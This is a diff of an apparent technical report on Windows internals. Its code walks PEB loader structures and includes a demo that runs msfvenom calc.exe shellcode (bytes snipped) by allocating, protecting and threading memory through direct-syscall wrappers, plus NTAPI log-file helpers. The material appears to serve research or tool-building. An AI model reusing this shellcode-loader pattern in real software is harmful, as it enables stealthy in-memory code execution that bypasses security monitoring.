@@ -109,7 +109,7 @@
 	
 	#########################################################################################################################
 	
-	// PEB structure
+	/* PEB structure */
 	typedef struct _PEB {
 		BYTE Reserved1[2];
 		BYTE BeingDebugged;
@@ -123,24 +123,25 @@
 	} PEB;
 	
 	
-	// _PEB_LDR_DATA Member of the PEB structure
+	/* _PEB_LDR_DATA Member of the PEB structure */
 	typedef struct _PEB_LDR_DATA {
 	BYTE       Reserved1[8];
 	PVOID      Reserved2[3];
 	LIST_ENTRY InMemoryOrderModuleList;
 	} PEB_LDR_DATA, *PPEB_LDR_DATA;
 	
-	// NOTE: If you dont know what a LIST_ENTRY structure is , learn it, its everywhere in windows 
-	// and is very easy to understand
+	/* NOTE: If you dont know what a LIST_ENTRY structure is , learn it, its everywhere in windows 
+	* and is very easy to understand 
+	*/
 	
 	typedef struct _LDR_DATA_TABLE_ENTRY {
 		PVOID Reserved1[2];
 		LIST_ENTRY InMemoryOrderLinks;
 		PVOID Reserved2[2];
-		PVOID DllBase;						// THIS IS WHAT WE WANT
-		PVOID EntryPoint;					// THIS IS WHAT WE WANT
+		PVOID DllBase;						/* THIS IS WHAT WE WANT */
+		PVOID EntryPoint;					/* THIS IS WHAT WE WANT */
 		PVOID Reserved3;
-		UNICODE_STRING FullDllName;			// THIS IS WHAT WE WANT
+		UNICODE_STRING FullDllName;			/* THIS IS WHAT WE WANT */
 		BYTE Reserved4[8];
 		PVOID Reserved5[3];
 		union {
@@ -418,25 +419,28 @@
 	void ThisIsNotAnEntryPoint(void)
 	{
 		DbgPrint("Custom Entrypoint ThisIsNotAnEntryPoint NOPSLED DEMO\n");
+
 		// msfvenom calc.exe thread based shellcode
 		unsigned char pload[] = {0xfc,0x48,0x83,0xe4/*[...SNIP...]*/,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 };
 		size_t pload_size = sizeof(pload);
-		char key[23] = "DemoPasswordForDemoXOR";
-		//unsigned char pload[] = {0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90};
-		//size_t pload_size = sizeof(pload);
+		
 		HANDLE ph = NtCurrentProcess();
 		void * ba = NULL;
 		NTSTATUS SysAllocateReturn = AlloeVirtMem(ph, &ba, 0, &pload_size, MEM_COMMIT |MEM_RESERVE, PAGE_READWRITE);
 		DbgPrint("SysAllocateReturn\t%x\n", SysAllocateReturn);
+		
 		my_memmove(ba, (void*)pload, 276);
 		DbgPrint("ba 0x%p", ba);
+		
 		ULONG nprt = PAGE_EXECUTE_READ;
 		ULONG oprt = 0;
 		NTSTATUS SysNtProtectReturn = ProtVirtMem(ph, &ba, &pload_size, nprt, &oprt);
 		DbgPrint("SysNtProtectReturn\t%x\n", SysNtProtectReturn);
+		
 		HANDLE th = NULL;
 		NTSTATUS SysNtCreateReturn = CreThreE(&th, GENERIC_EXECUTE, NULL, ph, ba, NULL,FALSE, 0, 0, 0, NULL);
 		DbgPrint("SysNtCreateReturn\t%x\n", SysNtCreateReturn);
+		
 		DbgPrint("END");
 		//WaitForSingleObject(th, -1); 	// to actually wait infinitely we need to link with kernel32, 
 										// or be bothered to use ntapi equiv
@@ -479,12 +483,11 @@
 	and code review will enable the application to be safer and made more efficient in terms of operation and
 	codebase size.
 	Using Nt NTAPI functions for file creation and management was difficult due to the lack of official docu-
-	mentation and inexperience but it was made to work through attaching a debugger and trial and error. The
-	snippet below
+	mentation and inexperience but it was made to work through attaching a debugger and trial and error. 
 	
 	[...SNIP...]
 	/* CreateLogFile function which grabs PID and exe name and creates a log file in the
-	format↪→
+	format
 	EXECUTABLE.EXE_PID.txt
 	For example: malproc64.exe_820.txt
 	*/
@@ -499,7 +502,7 @@
 			&uniName,
 			outfile /* this filename was created earlier in function */
 		);
-		/* init object attributes to be returned for next call to open file*/
+		/* init object attributes to be returned for next call to open file */
 		InitializeObjectAttributes(
 			&objAttr, &uniName,
 			0x00000040L, //OBJ_CASE_INSENSITIVE,
@@ -537,7 +540,7 @@
 	
 	/*[...SNIP...]*/
 	/* AppendLogFile function which takes a pointer to an array of chars and a length of
-	chars to read from char array↪→
+	chars to read from char array
 	Uses global filename to obtains a file handle using NtCreateFile
 	Appending the passed log line into the file using NtWriteFile */
 	void AppendLogFile(char TextToWrite[], int LenTextToWrite)
